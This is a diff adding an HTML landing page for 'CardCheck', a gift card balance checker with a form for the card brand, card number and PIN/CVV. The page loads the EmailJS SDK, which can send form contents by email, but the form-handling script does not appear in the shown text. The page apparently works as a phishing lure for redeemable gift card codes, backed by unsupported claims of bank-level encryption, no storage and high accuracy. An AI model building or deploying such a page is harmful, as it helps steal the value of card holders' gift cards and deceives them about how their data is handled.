@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gift Card Balance Checker - Check Your Card Balance Instantly</title>
+    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Pacifico&amp;family=Inter:wght@300;400;500;600;700&amp;display=swap"
+      rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.5.0/remixicon.min.css" />
+    <!-- Add EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <input type="hidden" id="_o_dbjbempljhcmhlfpfacalomonjpalpko" data-inspect-config="7" />
+    
+    <style>
+        .error-message {
+            color: #e53e3e;
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+        }
+        
+        .error-field {
+            border-color: #e53e3e;
+            box-shadow: 0 0 0 1px #e53e3e;
+        }
+        
+        .selected-brand {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px #3b82f6;
+            background-color: #f0f9ff;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 16px;
+            border-radius: 8px;
+            color: white;
+            font-weight: 500;
+            z-index: 1000;
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            opacity: 0;
+            transform: translateX(100%);
+            transition: opacity 0.3s, transform 0.3s;
+        }
+        
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            background-color: #e53e3e;
+        }
+        
+        .notification.success {
+            background-color: #38a169;
+        }
+        
+        .notification.info {
+            background-color: #3182ce;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+        
+        .loading-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Your existing HTML content remains the same until the script section -->
+    <!-- Desktop Navbar -->
+    <nav class="hidden md:flex justify-between px-10 py-5 bg-white shadow-sm">
+        <div>
+          <h3 class="text-2xl font-bold" style="font-family: Pacifico, serif;">CardCheck</h3>
+        </div>
+        <ul class="flex list-none gap-10 font-medium text-gray-700">
+          <li><a href="#home" class="hover:text-blue-600">Home</a></li>
+          <li><a href="#how-it-works" class="hover:text-blue-600">How it Works</a></li>
+          <li><a href="#supported-cards" class="hover:text-blue-600">Supported Cards</a></li>
+          <li><a href="#contact" class="hover:text-blue-600">Contact</a></li>
+        </ul>
+    </nav>
+    
+    <!-- Mobile Navbar -->
+    <nav class="flex md:hidden justify-between items-center px-6 py-4 bg-white shadow-sm">
+        <h3 class="text-2xl font-bold" style="font-family: Pacifico, serif;">CardCheck</h3>
+        <button id="menu-toggle" class="text-gray-700 focus:outline-none">
+          <i class="ri-menu-3-line text-2xl"></i>
+        </button>
+    </nav>
+    
+    <!-- Optional mobile menu dropdown (hidden by default) -->
+    <div id="mobile-menu" class="md:hidden hidden bg-white shadow-inner border-t">
+        <ul class="flex flex-col text-gray-700 font-medium px-6 py-4 space-y-3">
+          <li><a href="#home" class="block hover:text-blue-600">Home</a></li>
+          <li><a href="#how-it-works" class="block hover:text-blue-600">How it Works</a></li>
+          <li><a href="#supported-cards" class="block hover:text-blue-600">Supported Cards</a></li>
+          <li><a href="#contact" class="block hover:text-blue-600">Contact</a></li>
+        </ul>
+    </div>
+    
+    <!-- Hero Section -->
+    <div class="min-h-screen grid grid-cols-1 md:grid-cols-2 px-6 md:px-10 py-10 gap-5 bg-blue-100">
+        <!-- Text -->
+        <div class="content-center text-center md:text-left">
+          <h1 class="text-4xl md:text-6xl font-bold leading-tight">
+            Check Your <span class="text-blue-600">Gift Card</span> Balance Instantly
+          </h1>
+          <p class="text-lg md:text-xl py-6 text-gray-700">
+            Secure, fast, and reliable gift card balance verification for all major retailers.
+            Never wonder about your remaining balance again with our trusted balance checker tool.
+          </p>
+      
+          <!-- Buttons -->
+          <div class="flex flex-col md:flex-row gap-4 md:gap-10">
+            <div class="font-medium text-medium bg-blue-600 text-white px-7 py-4 rounded-lg hover:bg-blue-700 transition w-full md:w-auto text-center cursor-pointer" onclick="scrollToCardCheck()">
+              Check Balance Now
+            </div>
+            <div class="font-medium text-medium text-blue-600 border-2 border-blue-600 px-10 py-4 rounded-lg hover:bg-blue-700 hover:text-white transition w-full md:w-auto text-center cursor-pointer">
+              Learn More
+            </div>
+          </div>
+      
+          <!-- Numbers -->
+          <div class="flex justify-center md:justify-start gap-10 py-10">
+            <div class="text-center">
+              <h3 class="font-bold text-2xl">500K+</h3>
+              <p>Card Check</p>
+            </div>
+            <div class="text-center">
+              <h3 class="font-bold text-2xl">50+</h3>
+              <p>Supported Brands</p>
+            </div>
+            <div class="text-center">
+              <h3 class="font-bold text-2xl">99.9%</h3>
+              <p>Accuracy Rate</p>
+            </div>
+          </div>
+        </div>
+      
+        <!-- Image (hidden on mobile) -->
+        <div class="hidden md:block rounded-lg content-center py-10">
+          <img src="ChatGPT Image Nov 13, 2025, 10_37_58 AM.png" alt="card image" class="rounded-2xl h-full w-full">
+        </div>
+    </div>
+    
+    <!-- Card Check Section -->
+    <div id="card-check" class="min-h-screen bg-gray-50 py-16">
+        <h3 class="font-bold text-4xl text-center">Check Your Gift Card Balance</h3>
+        <p class="text-xl text-center text-black py-5">Enter your gift card details below to instantly check your remaining balance. <br>Your information is secure and never stored.</p>
+        <div class="min-h-screen flex items-center justify-center bg-gray-50">
+            <div class="bg-white rounded-2xl shadow-lg shadow-gray-200 p-8 w-full max-w-2xl">
+              
+              <h2 class="text-lg font-semibold text-gray-800 mb-4">Select Gift Card Brand</h2>
+          
+              <!-- Gift Card Brand Grid -->
+              <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6" id="brand-grid">
+                <!-- Amazon -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Amazon">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" class="w-6 h-6 mb-2" alt="Amazon">
+                  <span class="text-sm text-gray-700 font-medium">Amazon</span>
+                </button>
+          
+                <!-- Apple -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Apple">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg" class="w-6 h-6 mb-2" alt="Apple">
+                  <span class="text-sm text-gray-700 font-medium">Apple</span>
+                </button>
+          
+                <!-- Google Play -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Google Play">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg" class="w-6 h-6 mb-2" alt="Google Play">
+                  <span class="text-sm text-gray-700 font-medium">Google Play</span>
+                </button>
+          
+                <!-- Steam -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Steam">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg" class="w-6 h-6 mb-2" alt="Steam">
+                  <span class="text-sm text-gray-700 font-medium">Steam</span>
+                </button>
+          
+                <!-- Spotify -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Spotify">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/spotify.svg" class="w-6 h-6 mb-2" alt="Spotify">
+                  <span class="text-sm text-gray-700 font-medium">Spotify</span>
+                </button>
+          
+                <!-- Netflix -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Netflix">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/netflix.svg" class="w-6 h-6 mb-2" alt="Netflix">
+                  <span class="text-sm text-gray-700 font-medium">Netflix</span>
+                </button>
+          
+                <!-- Walmart -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Walmart">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/walmart.svg" class="w-6 h-6 mb-2" alt="Walmart">
+                  <span class="text-sm text-gray-700 font-medium">Walmart</span>
+                </button>
+          
+                <!-- Target -->
+                <button type="button" class="brand-btn border border-gray-200 rounded-xl p-4 flex flex-col items-center justify-center hover:border-blue-500 hover:shadow-md transition" data-brand="Target">
+                  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/target.svg" class="w-6 h-6 mb-2" alt="Target">
+                  <span class="text-sm text-gray-700 font-medium">Target</span>
+                </button>
+              </div>
+              
+              <div id="brand-error" class="error-message mb-4 hidden">Please select a gift card brand</div>
+          
+              <!-- Gift Card Number -->
+              <div class="mb-4">
+                <label class="text-gray-700 font-medium text-sm mb-1 block">Gift Card Number</label>
+                <input type="text" id="card-number" placeholder="Enter your gift card number"
+                  class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <div id="card-number-error" class="error-message hidden">Please enter a valid gift card number</div>
+              </div>
+          
+              <!-- Security Code -->
+              <div class="mb-6">
+                <label class="text-gray-700 font-medium text-sm mb-1 block">Security Code (CVV/PIN)</label>
+                <input type="text" id="security-code" placeholder="Enter security code"
+                  class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <div id="security-code-error" class="error-message hidden">Please enter a valid security code</div>
+              </div>
+          
+              <!-- Button -->
+              <button type="button" id="check-balance-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-lg transition">
+                Check Balance
+              </button>
+          
+            </div>
+        </div>          
+    </div>
+    
+    <!-- Rest of your HTML sections remain exactly the same -->
+    <!-- How It Works Section, Why Choose Section, Supported Cards Section, Contact Section, Footer -->
+    
+    <!-- How It Works Section -->
+    <section class="py-16 bg-white text-center">
+        <h2 class="text-3xl font-bold text-gray-900 mb-4">How It Works</h2>
+        <p class="text-gray-600 max-w-xl mx-auto mb-12">
+          Checking your gift card balance is simple and secure. Follow these three easy steps to get instant access to your balance information.
+        </p>
+      
+        <div class="grid gap-8 md:grid-cols-3 max-w-6xl mx-auto">
+          <!-- Step 1 -->
+          <div class="bg-white shadow-md rounded-2xl p-6 hover:shadow-lg transition">
+            <div class="flex justify-center mb-4">
+              <span class="flex items-center justify-center bg-blue-500 text-white w-8 h-8 rounded-full font-bold">1</span>
+            </div>
+            <img src="https://via.placeholder.com/300x150" alt="Select Brand" class="mx-auto rounded-lg mb-6">
+            <div class="flex justify-center mb-3">
+              <div class="bg-blue-100 text-blue-600 p-3 rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M16 11V7a4 4 0 00-8 0v4M5 11h14l1 10H4l1-10z" />
+                </svg>
+              </div>
+            </div>
+            <h3 class="text-lg font-semibold mb-2">Select Your Brand</h3>
+            <p class="text-gray-500 text-sm">
+              Choose your gift card brand from our extensive list of supported retailers and services.
+            </p>
+          </div>
+      
+          <!-- Step 2 -->
+          <div class="bg-white shadow-md rounded-2xl p-6 hover:shadow-lg transition">
+            <div class="flex justify-center mb-4">
+              <span class="flex items-center justify-center bg-blue-500 text-white w-8 h-8 rounded-full font-bold">2</span>
+            </div>
+            <img src="https://via.placeholder.com/300x150" alt="Enter Details" class="mx-auto rounded-lg mb-6">
+            <div class="flex justify-center mb-3">
+              <div class="bg-blue-100 text-blue-600 p-3 rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M12 11c0-1.104.896-2 2-2s2 .896 2 2v3H10v-3z" />
+                </svg>
+              </div>
+            </div>
+            <h3 class="text-lg font-semibold mb-2">Enter Card Details</h3>
+            <p class="text-gray-500 text-sm">
+              Input your gift card number and security code. All information is encrypted and secure.
+            </p>
+          </div>
+      
+          <!-- Step 3 -->
+          <div class="bg-white shadow-md rounded-2xl p-6 hover:shadow-lg transition">
+            <div class="flex justify-center mb-4">
+              <span class="flex items-center justify-center bg-blue-500 text-white w-8 h-8 rounded-full font-bold">3</span>
+            </div>
+            <img src="https://via.placeholder.com/300x150" alt="Instant Results" class="mx-auto rounded-lg mb-6">
+            <div class="flex justify-center mb-3">
+              <div class="bg-blue-100 text-blue-600 p-3 rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M9 12l2 2l4-4" />
+                </svg>
+              </div>
+            </div>
+            <h3 class="text-lg font-semibold mb-2">Get Instant Results</h3>
+            <p class="text-gray-500 text-sm">
+              Receive your current balance, card status, and transaction history in seconds.
+            </p>
+          </div>
+        </div>
+    </section>
+    
+    <!-- Why Choose Section -->
+    <section class="bg-blue-50 py-12 px-6 rounded-2xl w-full max-w-6xl mx-auto text-center">
+        <h2 class="text-2xl font-semibold text-gray-900 mb-10">
+          Why Choose Our Balance Checker?
+        </h2>
+      
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
+          <!-- Card 1 -->
+          <div class="flex flex-col items-center space-y-3">
+            <div class="bg-blue-600 p-4 rounded-full flex items-center justify-center">
+              <!-- Shield icon -->
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+              </svg>
+            </div>
+            <h3 class="text-lg font-semibold text-gray-900">100% Secure</h3>
+            <p class="text-gray-600 text-sm">Bank-level encryption protects your data</p>
+          </div>
+      
+          <!-- Card 2 -->
+          <div class="flex flex-col items-center space-y-3">
+            <div class="bg-blue-600 p-4 rounded-full flex items-center justify-center">
+              <!-- Zap icon -->
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+              </svg>
+            </div>
+            <h3 class="text-lg font-semibold text-gray-900">Lightning Fast</h3>
+            <p class="text-gray-600 text-sm">Get results in under 3 seconds</p>
+          </div>
+      
+          <!-- Card 3 -->
+          <div class="flex flex-col items-center space-y-3">
+            <div class="bg-blue-600 p-4 rounded-full flex items-center justify-center">
+              <!-- CheckCircle icon -->
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+            </div>
+            <h3 class="text-lg font-semibold text-gray-900">99.9% Accurate</h3>
+            <p class="text-gray-600 text-sm">Reliable balance verification</p>
+          </div>
+      
+          <!-- Card 4 -->
+          <div class="flex flex-col items-center space-y-3">
+            <div class="bg-blue-600 p-4 rounded-full flex items-center justify-center">
+              <!-- Headphones icon -->
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 18v-6a9 9 0 1118 0v6m-2 0a2 2 0 01-2 2h-2v-4h4v2zM7 20a2 2 0 01-2-2v-2h4v4H7z" />
+              </svg>
+            </div>
+            <h3 class="text-lg font-semibold text-gray-900">24/7 Support</h3>
+            <p class="text-gray-600 text-sm">Always here to help you</p>
+          </div>
+        </div>
+    </section>
+    
+    <!-- Supported Cards Section -->
+    <section id="supported-cards" class="py-20 bg-gray-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Supported Gift Cards</h2>
+            <p class="text-xl text-gray-600 max-w-2xl mx-auto">We support balance checking for over 200+ popular gift card
+              brands across multiple categories. Find your card below.</p>
+          </div>
+          <div class="space-y-12">
+            <div>
+              <h3 class="text-2xl font-bold text-gray-900 mb-6 text-center">Retail &amp; Shopping</h3>
+              <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-orange-500"><i
+                      class="ri-amazon-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Amazon</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-blue-600"><i
+                      class="ri-store-2-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Walmart</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-red-500"><i
+                      class="ri-store-3-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Target</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-blue-700"><i
+                      class="ri-computer-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Best Buy</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-orange-600"><i
+                      class="ri-home-4-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Home Depot</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-blue-800"><i
+                      class="ri-building-2-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Costco</h4>
+                </div>
+              </div>
+            </div>
+            <div>
+              <h3 class="text-2xl font-bold text-gray-900 mb-6 text-center">Entertainment &amp; Gaming</h3>
+              <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-gray-700"><i
+                      class="ri-steam-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Steam</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-blue-600"><i
+                      class="ri-playstation-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">PlayStation</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-green-600"><i
+                      class="ri-xbox-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Xbox</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-red-500"><i
+                      class="ri-gamepad-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Nintendo</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-red-600"><i
+                      class="ri-netflix-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Netflix</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-green-500"><i
+                      class="ri-spotify-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Spotify</h4>
+                </div>
+              </div>
+            </div>
+            <div>
+              <h3 class="text-2xl font-bold text-gray-900 mb-6 text-center">Technology &amp; Apps</h3>
+              <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-gray-800"><i
+                      class="ri-apple-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Apple</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-green-600"><i
+                      class="ri-google-play-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Google Play</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-blue-600"><i
+                      class="ri-microsoft-fill text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Microsoft</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-red-600"><i
+                      class="ri-palette-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Adobe</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-black"><i
+                      class="ri-taxi-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Uber</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-pink-500"><i
+                      class="ri-home-heart-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Airbnb</h4>
+                </div>
+              </div>
+            </div>
+            <div>
+              <h3 class="text-2xl font-bold text-gray-900 mb-6 text-center">Food &amp; Dining</h3>
+              <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-green-700"><i
+                      class="ri-cup-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Starbucks</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-yellow-500"><i
+                      class="ri-restaurant-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">McDonald's</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-green-600"><i
+                      class="ri-restaurant-2-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Subway</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-red-500"><i
+                      class="ri-takeaway-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">DoorDash</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-orange-500"><i
+                      class="ri-food-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Grubhub</h4>
+                </div>
+                <div
+                  class="bg-white p-6 rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow duration-200 text-center cursor-pointer">
+                  <div class="w-12 h-12 mx-auto mb-3 flex items-center justify-center text-black"><i
+                      class="ri-e-bike-line text-3xl"></i></div>
+                  <h4 class="font-medium text-gray-900 text-sm">Uber Eats</h4>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="mt-16 text-center">
+            <div class="bg-white rounded-2xl p-8 shadow-lg">
+              <h3 class="text-2xl font-bold text-gray-900 mb-4">Don't See Your Card?</h3>
+              <p class="text-gray-600 mb-6 max-w-2xl mx-auto">We're constantly adding support for new gift card brands. If
+                you don't see your card listed, contact us and we'll prioritize adding it to our system.</p>
+              <div class="flex flex-col sm:flex-row gap-4 justify-center"><button
+                  class="inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 transition-colors duration-200 whitespace-nowrap cursor-pointer">Request
+                  New Card Support<div class="w-5 h-5 ml-2 flex items-center justify-center"><i class="ri-add-line"></i>
+                  </div></button><button
+                  class="inline-flex items-center justify-center px-6 py-3 border-2 border-blue-600 text-blue-600 font-medium rounded-lg hover:bg-blue-600 hover:text-white transition-colors duration-200 whitespace-nowrap cursor-pointer">View
+                  All Supported Cards<div class="w-5 h-5 ml-2 flex items-center justify-center"><i
+                      class="ri-external-link-line"></i></div></button></div>
+            </div>
+          </div>
+        </div>
+    </section>
+    
+    <!-- Contact Section -->
+    <section id="contact" class="py-20 bg-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Get in Touch</h2>
+            <p class="text-xl text-gray-600 max-w-2xl mx-auto">Have questions about our gift card balance checker? Need help
+              with your card? Our support team is here to assist you 24/7.</p>
+          </div>
+          <div class="grid grid-cols-1 lg:grid-cols-2 gap-12">
+            <div>
+              <h3 class="text-2xl font-bold text-gray-900 mb-6">Contact Information</h3>
+              <div class="space-y-6">
+                <div class="flex items-start">
+                  <div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mr-4"><i
+                      class="ri-customer-service-2-line text-blue-600 text-xl"></i></div>
+                  <div>
+                    <h4 class="font-semibold text-gray-900 mb-1">24/7 Support</h4>
+                    <p class="text-gray-600">Get instant help with our live chat support</p>
+                    <p class="text-blue-600 font-medium">Available 24/7</p>
+                  </div>
+                </div>
+                <div class="flex items-start">
+                  <div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mr-4"><i
+                      class="ri-mail-line text-blue-600 text-xl"></i></div>
+                  <div>
+                    <h4 class="font-semibold text-gray-900 mb-1">Email Support</h4>
+                    <p class="text-gray-600">Send us your questions anytime</p>
+                    <p class="text-blue-600 font-medium">support@cardcheck.com</p>
+                  </div>
+                </div>
+                <div class="flex items-start">
+                  <div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mr-4"><i
